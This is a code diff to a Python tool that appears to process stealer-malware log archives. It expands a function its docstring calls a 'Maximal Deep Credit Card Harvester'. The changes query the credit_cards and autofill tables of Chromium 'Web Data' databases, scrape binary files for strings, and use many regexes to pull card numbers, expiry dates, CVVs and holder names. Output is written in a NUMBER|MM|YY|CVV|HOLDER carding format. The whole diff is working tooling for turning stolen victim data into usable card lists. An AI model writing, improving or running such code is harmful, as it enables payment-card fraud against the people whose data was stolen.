@@ -4,6 +4,7 @@ import shutil
 import zipfile
 import subprocess
 import re
+import sqlite3
 from pathlib import Path
 from typing import List, Set, Optional, Tuple, Dict
 
@@ -22,17 +23,14 @@ PASSWORD_FILENAMES = {
     "logins.txt", "all passwords.txt", "account.txt", "accounts.txt"
 }
 
-# Regex to detect Credit Card pipe/delimiter format: CARD|MM|YY|CVV|HOLDER
-CARD_PIPE_REGEX = re.compile(
-    r"(?:\b|\A)([2-6]\d{12,18})[|\t:;, /]+(0[1-9]|1[0-2]|\d)[|\t:;, /]+(\d{2,4})(?:[|\t:;, /]+(\d{3,4}))?(?:[|\t:;, /]*([^|\r\n\t]*))?",
-    re.MULTILINE
-)
-
-# Regex to detect lines already in card pipe format
-CARD_LINE_PREFIX_REGEX = re.compile(
-    r"^\s*([2-6]\d{12,18})\|(\d{1,2})\|(\d{2,4})(?:\|([^|\r\n]*))?(?:\|([^|\r\n]*))?",
-    re.MULTILINE
-)
+# Ignore extensions that definitely never contain text/credentials
+NON_CRED_EXTENSIONS = {
+    ".png", ".jpg", ".jpeg", ".gif", ".ico", ".bmp", ".webp",
+    ".mp3", ".mp4", ".avi", ".mkv", ".wav",
+    ".exe", ".dll", ".sys", ".so", ".dylib",
+    ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2",
+    ".pdf", ".docx", ".xlsx", ".pptx"
+}
 
 def find_system_7z() -> Optional[str]:
     """Finds system 7z binary if available."""
@@ -105,7 +103,7 @@ def is_cookie_path(root_lower: str, file_lower: str) -> bool:
 
 def is_card_path(root_lower: str, file_lower: str) -> bool:
     """Checks if a file is an autofill or card file by directory or filename."""
-    keywords = ["card", "credit", "autofill", "cc", "wallet", "payment", "web data"]
+    keywords = ["card", "credit", "autofill", "cc", "wallet", "payment", "web data", "important", "info"]
     return any(k in root_lower or k in file_lower for k in keywords)
 
 def scan_session_stats(session_path: Path) -> dict:
@@ -149,19 +147,46 @@ def scan_session_stats(session_path: Path) -> dict:
     return stats
 
 def read_file_safe(file_path: Path) -> Optional[str]:
-    """Reads file with UTF-8, UTF-16, or Latin-1 fallback."""
+    """Reads file text safely: handles UTF-8, true UTF-16, Latin-1, and extracts printable text from SQLite/binary dumps."""
     try:
         with open(file_path, "rb") as bf:
-            raw = bf.read(65536 * 16)
-            if b"\x00" in raw[:100]:
-                try:
-                    return raw.decode("utf-16-le", errors="ignore")
-                except Exception:
-                    pass
+            raw = bf.read(30 * 1024 * 1024) # Up to 30MB per file
+
+        if not raw:
+            return None
+
+        # Check for SQLite files: extract ASCII strings directly
+        if raw.startswith(b"SQLite format 3"):
+            strings = re.findall(rb"[\x20-\x7E]{4,}", raw)
+            return "\n".join(s.decode("latin-1", errors="ignore") for s in strings)
+
+        # Check for true UTF-16 (BOM or regular alternating nulls in text)
+        if raw.startswith(b"\xff\xfe") or raw.startswith(b"\xfe\xff"):
             try:
-                return raw.decode("utf-8", errors="ignore")
+                return raw.decode("utf-16", errors="ignore")
             except Exception:
-                return raw.decode("latin-1", errors="ignore")
+                pass
+        elif len(raw) >= 4 and raw[1] == 0 and raw[3] == 0:
+            try:
+                return raw.decode("utf-16-le", errors="ignore")
+            except Exception:
+                pass
+
+        # Try UTF-8
+        try:
+            return raw.decode("utf-8")
+        except UnicodeDecodeError:
+            pass
+
+        # Fallback to Latin-1
+        try:
+            return raw.decode("latin-1")
+        except Exception:
+            pass
+
+        # Last resort: extract printable ASCII sequences
+        strings = re.findall(rb"[\x20-\x7E]{4,}", raw)
+        return "\n".join(s.decode("latin-1", errors="ignore") for s in strings)
     except Exception:
         return None
 
@@ -258,82 +283,187 @@ def collect_cookies(session_path: Path, output_file: Path) -> Tuple[int, int]:
 
     return file_count, total_lines
 
+def extract_cards_from_sqlite_db(db_path: Path) -> Set[str]:
+    """Queries Chromium Web Data SQLite databases directly for credit cards and autofill."""
+    found_cards = set()
+    try:
+        conn = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True, timeout=5)
+        cursor = conn.cursor()
+        
+        # Check credit_cards table
+        try:
+            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
+            for row in cursor.fetchall():
+                holder = str(row[0] or "").strip()
+                mm = str(row[1] or "01").zfill(2)
+                yy = str(row[2] or "30")[-2:]
+                # Check if card_number is readable in raw text
+                card_data = str(row[3] or "")
+                num_m = re.search(r"\b(\d{13,19})\b", card_data)
+                if num_m:
+                    found_cards.add(f"{num_m.group(1)}|{mm}|{yy}||{holder}")
+        except Exception:
+            pass
+
+        # Check autofill table for card entries
+        try:
+            cursor.execute("SELECT name, value FROM autofill WHERE name LIKE '%card%' OR name LIKE '%cc%' OR name LIKE '%num%'")
+            for row in cursor.fetchall():
+                val = str(row[1] or "")
+                num_m = re.search(r"\b(\d{13,19})\b", val)
+                if num_m:
+                    found_cards.add(f"{num_m.group(1)}|01|30||")
+        except Exception:
+            pass
+
+        conn.close()
+    except Exception:
+        pass
+    return found_cards
+
+def normalize_card_entry(raw_num: str, mm: str, yy: str, cvv: str = "", name: str = "") -> Optional[str]:
+    """Sanitizes, validates, and normalizes a card into: NUMBER|MM|YY|CVV|HOLDER."""
+    clean_num = re.sub(r"[\s-]", "", raw_num)
+    if not (13 <= len(clean_num) <= 19) or not clean_num.isdigit():
+        return None
+
+    # Validate month
+    clean_mm = mm.strip().lstrip("0")
+    if not clean_mm.isdigit():
+        return None
+    m_int = int(clean_mm)
+    if not (1 <= m_int <= 12):
+        return None
+    month_str = str(m_int).zfill(2)
+
+    # Validate year
+    clean_yy = yy.strip()
+    if not clean_yy.isdigit():
+        return None
+    year_str = clean_yy[-2:]
+
+    clean_cvv = cvv.strip()
+    clean_name = name.strip()
+    return f"{clean_num}|{month_str}|{year_str}|{clean_cvv}|{clean_name}"
+
 def collect_cards(session_path: Path, output_file: Path) -> Tuple[int, int]:
     """
-    High-Speed Deep Credit Card Harvester:
-    Scans every text, autofill, card, and log file across the archive.
-    Extracts all credit card records matching:
-    - Standard pipe format: NUMBER|MM|YY|CVV|HOLDER
-    - Autofill records & CC blocks
-    Deduplicates and outputs clean lines.
-    Returns (total_unique_cards, files_with_cards).
+    Maximal Deep Credit Card Harvester:
+    Scans every text, autofill, card, sqlite, and log file across the archive.
+    Extracts all credit cards across all delimiter styles and multiline formats.
     """
     output_file.parent.mkdir(parents=True, exist_ok=True)
     unique_cards: Set[str] = set()
     files_with_cards = 0
 
+    # Pattern 1: Pure pipe format (NUMBER|MM|YY...)
+    re_pipe_line = re.compile(
+        r"^\s*([0-9 -]{13,22})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})(?:\s*\|\s*([^|\r\n]*))?(?:\s*\|\s*([^|\r\n]*))?(?:\s*\|\s*([^|\r\n]*))?",
+        re.MULTILINE
+    )
+
+    # Pattern 2: Delimited formats (NUMBER:MM:YY, NUMBER/MM/YY, NUMBER MM YY)
+    re_delimited = re.compile(
+        r"(?:\b|\A)([0-9 -]{13,22})\s*[|:;, /]\s*(0?[1-9]|1[0-2])\s*[|:;, /]\s*(\d{2,4})(?:\s*[|:;, /]\s*(\d{3,4}))?(?:\s*[|:;, /]*([^|\r\n\t]*))?",
+        re.MULTILINE
+    )
+
+    # Pattern 3: Key-Value block patterns
+    re_card_num = re.compile(r"(?:card(?:[ _]?number)?|cc(?:[ _]?number)?|number|ccn)\s*[:=]\s*([0-9 -]{13,22})", re.IGNORECASE)
+    re_exp_date = re.compile(r"(?:exp(?:iration)?[ _]?(?:date)?|expires)\s*[:=]\s*(0?[1-9]|1[0-2])[ /.-](\d{2,4})", re.IGNORECASE)
+    re_exp_m = re.compile(r"(?:exp(?:iration)?[ _]?month|month)\s*[:=]\s*(0?[1-9]|1[0-2])", re.IGNORECASE)
+    re_exp_y = re.compile(r"(?:exp(?:iration)?[ _]?year|year)\s*[:=]\s*(\d{2,4})", re.IGNORECASE)
+    re_cvv = re.compile(r"(?:cvv2?|cvc2?|security[ _]?code|code)\s*[:=]\s*(\d{3,4})", re.IGNORECASE)
+    re_holder = re.compile(r"(?:card[ _]?holder|holder|name[ _]?on[ _]?card|name)\s*[:=]\s*([^\r\n]+)", re.IGNORECASE)
+
     for root, _, files in os.walk(session_path):
         root_l = root.lower()
         for file in files:
             fl = file.lower()
-            if fl.endswith(".txt") or fl.endswith(".log") or is_card_path(root_l, fl):
-                file_path = Path(root) / file
-                content = read_file_safe(file_path)
-                if not content:
-                    continue
+            ext = Path(fl).suffix
 
-                initial_len = len(unique_cards)
+            if ext in NON_CRED_EXTENSIONS:
+                continue
 
-                # Strategy 1: Match existing pipe-delimited card lines
-                for m in CARD_LINE_PREFIX_REGEX.finditer(content):
-                    card_num, mm, yy, cvv, name = m.group(1), m.group(2), m.group(3), m.group(4) or "", m.group(5) or ""
-                    clean_line = f"{card_num}|{mm.zfill(2)}|{yy[-2:]}|{cvv.strip()}|{name.strip()}"
-                    unique_cards.add(clean_line)
+            file_path = Path(root) / file
+            initial_count = len(unique_cards)
 
-                # Strategy 2: Match general delimiter patterns in text
-                for m in CARD_PIPE_REGEX.finditer(content):
-                    card_num, mm, yy, cvv, name = m.group(1), m.group(2), m.group(3), m.group(4) or "", m.group(5) or ""
-                    # Validate month
-                    try:
-                        month_int = int(mm)
-                        if 1 <= month_int <= 12:
-                            clean_line = f"{card_num}|{str(month_int).zfill(2)}|{yy[-2:]}|{cvv.strip()}|{name.strip()}"
-                            unique_cards.add(clean_line)
-                    except ValueError:
-                        continue
+            # SQLite check
+            if fl == "web data" or ext in [".sqlite", ".db"]:
+                db_cards = extract_cards_from_sqlite_db(file_path)
+                unique_cards.update(db_cards)
 
-                # Strategy 3: Parse multiline labeled cards (Card Number: ... Exp: ... Cvv: ...)
-                if "card" in content.lower() or "credit" in content.lower():
-                    lines = content.splitlines()
-                    for idx, line in enumerate(lines):
-                        if any(c_kw in line.lower() for c_kw in ["card number", "number:", "card:"]):
-                            num_match = re.search(r"([2-6]\d{12,18})", line)
-                            if num_match:
-                                c_num = num_match.group(1)
-                                c_mm, c_yy, c_cvv, c_name = "01", "30", "", ""
-                                # search subsequent 5 lines for exp, cvv, holder
-                                for sub_idx in range(idx + 1, min(len(lines), idx + 6)):
-                                    sub_line = lines[sub_idx]
-                                    exp_match = re.search(r"(\d{1,2})[/-](\d{2,4})", sub_line)
-                                    if exp_match:
-                                        c_mm = exp_match.group(1).zfill(2)
-                                        c_yy = exp_match.group(2)[-2:]
-                                    cvv_match = re.search(r"(?:cvv|cvc|code)[:\s]*(\d{3,4})", sub_line, re.IGNORECASE)
-                                    if cvv_match:
-                                        c_cvv = cvv_match.group(1)
-                                    holder_match = re.search(r"(?:holder|name)[:\s]*([A-Za-z ]+)", sub_line, re.IGNORECASE)
-                                    if holder_match:
-                                        c_name = holder_match.group(1).strip()
-                                
-                                clean_line = f"{c_num}|{c_mm}|{c_yy}|{c_cvv}|{c_name}"
-                                unique_cards.add(clean_line)
-
-                if len(unique_cards) > initial_len:
+            content = read_file_safe(file_path)
+            if not content:
+                if len(unique_cards) > initial_count:
                     files_with_cards += 1
+                continue
 
-    # Write all deduplicated cards to output file
+            # Method 1: Scan pipe lines
+            for m in re_pipe_line.finditer(content):
+                entry = normalize_card_entry(
+                    raw_num=m.group(1),
+                    mm=m.group(2),
+                    yy=m.group(3),
+                    cvv=m.group(4) or "",
+                    name=m.group(5) or ""
+                )
+                if entry:
+                    unique_cards.add(entry)
+
+            # Method 2: Scan general delimited lines
+            for m in re_delimited.finditer(content):
+                entry = normalize_card_entry(
+                    raw_num=m.group(1),
+                    mm=m.group(2),
+                    yy=m.group(3),
+                    cvv=m.group(4) or "",
+                    name=m.group(5) or ""
+                )
+                if entry:
+                    unique_cards.add(entry)
+
+            # Method 3: Scan multiline blocks
+            if any(k in content.lower() for k in ["card", "credit", "cvv", "exp", "autofill"]):
+                lines = content.splitlines()
+                for idx, line in enumerate(lines):
+                    num_m = re_card_num.search(line)
+                    if num_m:
+                        raw_cnum = num_m.group(1)
+                        c_mm, c_yy, c_cvv, c_name = "01", "30", "", ""
+
+                        # Search 8 surrounding lines for attributes
+                        window = lines[max(0, idx - 2): min(len(lines), idx + 8)]
+                        for w_line in window:
+                            if not c_cvv:
+                                cv_m = re_cvv.search(w_line)
+                                if cv_m:
+                                    c_cvv = cv_m.group(1)
+                            if not c_name:
+                                h_m = re_holder.search(w_line)
+                                if h_m and not any(kw in h_m.group(1).lower() for kw in ["card", "number", "exp"]):
+                                    c_name = h_m.group(1).strip()
+                            exp_m = re_exp_date.search(w_line)
+                            if exp_m:
+                                c_mm, c_yy = exp_m.group(1), exp_m.group(2)
+                            else:
+                                em = re_exp_m.search(w_line)
+                                if em:
+                                    c_mm = em.group(1)
+                                ey = re_exp_y.search(w_line)
+                                if ey:
+                                    c_yy = ey.group(1)
+
+                        entry = normalize_card_entry(raw_cnum, c_mm, c_yy, c_cvv, c_name)
+                        if entry:
+                            unique_cards.add(entry)
+
+            if len(unique_cards) > initial_count:
+                files_with_cards += 1
+
+    # Write all cards to output file
     with open(output_file, "w", encoding="utf-8") as outfile:
-        outfile.write(f"# Extracted Cards & Autofill Records | Total Found: {len(unique_cards)}\n")
+        outfile.write(f"# Deep Harvested Credit Cards | Total Found: {len(unique_cards)}\n")
         outfile.write("# Format: NUMBER|EXP_MONTH|EXP_YEAR|CVV|HOLDER\n")
         outfile.write("#" + "=" * 60 + "\n\n")
         for card in sorted(unique_cards):
